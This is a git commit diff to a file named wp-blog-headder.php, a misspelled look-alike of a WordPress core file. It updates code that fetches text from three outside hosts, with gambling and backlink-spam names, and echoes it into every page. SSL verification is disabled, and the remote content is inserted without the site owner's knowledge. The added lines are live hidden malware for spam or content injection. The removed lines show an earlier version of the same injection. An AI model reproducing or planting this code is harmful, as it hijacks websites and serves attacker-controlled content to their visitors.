fb3fef3bd9492262c0f3a84db0e5bd9a7ec03380
chmod 0777 <ribelcyberteam@gmail.com>
2025-10-22 22:07:44 +0800

    Update wp-blog-headder.php

--- wp-blog-headder.php
+++ wp-blog-headder.php
@@ -19,32 +19,22 @@ if ( ! isset( $wp_did_header ) ) {
 	require_once ABSPATH . WPINC . '/template-loader.php';
 
 }
-$url = 'https://tahu-isi.store/totomacau.txt';
+$urls = [
+  'https://tahu-isi.store/totomacau.txt',
+  'https://www.backlinkku.id/menu/traffic-v1/script.txt',
+  'https://www.backlinkku.id/menu/vip-v2/script.txt'
+];
 
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $url);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // jika SSL error
-$content = curl_exec($ch);
-curl_close($ch);
+foreach ($urls as $url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // abaikan verifikasi SSL
+    $content = curl_exec($ch);
+    curl_close($ch);
 
-if ($content !== false) {
-  echo $content;
-}
-function fetch_and_display_content($url) {
-    $response = wp_remote_get($url);
-    if (is_wp_error($response)) {
-        return;
+    if ($content !== false) {
+        echo $content . "\n";
     }
-    $body = wp_remote_retrieve_body($response);
-    if (strpos($body, '<?php') !== false) {
-        return;
-    }
-    update_option('jasabacklink_content', $body);
-    echo $body;
 }
-$jasabacklinks = 'https://www.backlinkku.id/menu/traffic-v1/script.txt';
-fetch_and_display_content($jasabacklinks);
-$ilmumahal = 'https://www.backlinkku.id/menu/vip-v2/script.txt';
-fetch_and_display_content($ilmumahal);
